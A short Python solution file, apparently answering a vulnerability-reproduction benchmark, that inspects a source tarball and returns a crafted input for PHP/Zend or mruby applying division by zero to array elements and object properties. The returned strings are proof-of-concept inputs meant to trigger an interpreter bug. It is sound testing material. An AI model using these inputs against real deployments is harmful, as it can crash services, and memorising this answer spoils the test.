import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                names = [m.name.lower() for m in tar.getmembers()]
        except Exception:
            names = []

        if any('php' in n or 'zend' in n for n in names):
            return b'$a=[1];$a[0]/=0;class C{public $v=1;}$o=new C;$o->v/=0;'
        if any('mruby' in n for n in names):
            return b'a=[1];a[0]/=0'
        return b'$a=[1];$a[0]/=0;'
